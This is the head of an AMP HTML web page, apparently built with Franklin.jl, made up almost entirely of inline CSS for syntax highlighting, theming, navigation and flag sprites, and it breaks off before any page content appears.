<!doctypehtml><html amp lang=ms><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:8rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){#site-nav{top:5rem}}@media (max-width: 480px){.masthead{height:30rem}#site-nav ul li{width:calc(100% - 2rem)}}@media (max-width: 680px){.masthead{height:26rem}#site-nav{z-index:1}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"â€‹";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes 